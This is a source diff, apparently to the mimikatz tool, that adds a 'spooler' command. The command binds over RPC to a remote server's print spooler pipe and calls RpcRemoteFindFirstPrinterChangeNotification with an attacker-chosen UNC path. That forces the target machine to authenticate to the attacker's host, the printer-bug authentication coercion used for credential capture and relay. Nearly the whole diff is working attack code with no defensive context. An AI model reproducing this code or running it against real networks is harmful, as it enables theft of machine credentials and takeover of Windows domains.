@@ -27,6 +27,7 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_xor,		L"xor",			NULL},
 	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
 	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
+	{kuhl_m_misc_spooler,	L"spooler",		NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -1328,6 +1329,73 @@ NTSTATUS kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey(int argc, wchar_t * ar
 		}
 	}
 	else PRINT_ERROR(L"/keyvalue:base64 is needed\n");
+
+	return STATUS_SUCCESS;
+}
+
+handle_t hSpoolHandle = NULL;
+handle_t __RPC_USER STRING_HANDLE_bind(IN STRING_HANDLE Name) {return hSpoolHandle;}
+void __RPC_USER STRING_HANDLE_unbind(IN STRING_HANDLE Name, handle_t hSpool) {}
+NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[])
+{
+	LPCWSTR szRemote, szCallbackTo;
+	LPWSTR szPathToCallback = NULL;
+	PRINTER_HANDLE hPrinter;
+	DEVMODE_CONTAINER Container = {0, NULL};
+	DWORD ret;
+
+	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"connect", &szCallbackTo, NULL) || kull_m_string_args_byName(argc, argv, L"callback", &szCallbackTo, NULL))
+		{
+			if(kull_m_string_sprintf(&szPathToCallback, L"\\\\%s", szCallbackTo))
+			{
+				kprintf(L"[info] %s will try to connect to %s\\IPC$\n\n", szRemote, szPathToCallback);
+				if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, L"\\pipe\\spoolss", L"spooler", TRUE, RPC_C_AUTHN_DEFAULT, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hSpoolHandle, NULL))
+				{
+					RpcTryExcept
+					{
+						ret = RpcOpenPrinter(NULL, &hPrinter, NULL, &Container, GENERIC_READ);
+						if(ret == ERROR_SUCCESS)
+						{
+							ret = RpcRemoteFindFirstPrinterChangeNotification(hPrinter, PRINTER_CHANGE_ALL, PRINTER_NOTIFY_CATEGORY_ALL, szPathToCallback, 42, 0, NULL);
+							if(ret == ERROR_SUCCESS)
+							{
+								kprintf(L"Connected to the target, and notification is OK (?!)\n");
+								ret = RpcFindClosePrinterChangeNotification(hPrinter);
+								if(ret != ERROR_SUCCESS)
+								{
+									PRINT_ERROR(L"RpcFindClosePrinterChangeNotification: 0x%08x\n", ret);
+								}
+							}
+							else if(ret == ERROR_ACCESS_DENIED)
+							{
+								kprintf(L"Access is denied (can be OK)\n");
+							}
+							else PRINT_ERROR(L"RpcRemoteFindFirstPrinterChangeNotification: 0x%08x\n", ret);
+
+							ret = RpcClosePrinter(&hPrinter);
+							if(ret != ERROR_SUCCESS)
+							{
+								PRINT_ERROR(L"RpcClosePrinter: 0x%08x\n", ret);
+							}
+						}
+						else PRINT_ERROR(L"RpcOpenPrinter: 0x%08x\n", ret);
+					}
+					RpcExcept(RPC_EXCEPTION)
+						PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+					RpcEndExcept
+
+					kull_m_rpc_deleteBinding(&hSpoolHandle);
+				}
+
+				LocalFree(szPathToCallback);
+			}
+		}
+		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
+
+	}
+	else PRINT_ERROR(L"missing /server argument to specify spooler server");
 
 	return STATUS_SUCCESS;
 }
